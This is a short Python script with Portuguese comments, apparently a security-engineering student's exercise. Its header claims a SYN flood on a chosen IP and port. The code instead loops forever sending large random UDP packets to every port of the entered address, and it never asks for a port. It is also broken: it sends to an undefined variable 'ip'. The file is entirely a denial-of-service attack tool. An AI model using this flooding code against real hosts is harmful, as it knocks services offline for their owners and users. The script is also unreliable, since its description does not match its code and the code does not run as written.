# Paulo Abade - 23919
# Mestrado de Engenharia de Segurança Informática
# Iniciado em 20/10/2025
# Última atualização: 29/10/2025

# Faz um ataque de SYN Flood a um IP e a uma porta que tenham sido especificados pelo utilizador

import ipaddress
import socket
import random
import time


def dos_attack():
    print("DoS Attack")

     # Validar o endereço IP
    is_an_ip = False
    while not is_an_ip:
        target_ip = input("Insira um IP dentro da sua rede privada (ex: 192.168.1.254): \n")
        try:
            ip_obj = ipaddress.ip_address(target_ip)
            is_an_ip = True
        except ValueError:
            print("Erro: Formato de IP inválido.\n")

    sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) 
    bytes=random._urandom(65000) 
    sent=0
    while 1:
        for i in range(1,65536):
            port=i
            sock.sendto(bytes,(ip,port))
            sent=sent+1
            time.sleep(0.00001) # Wait Time

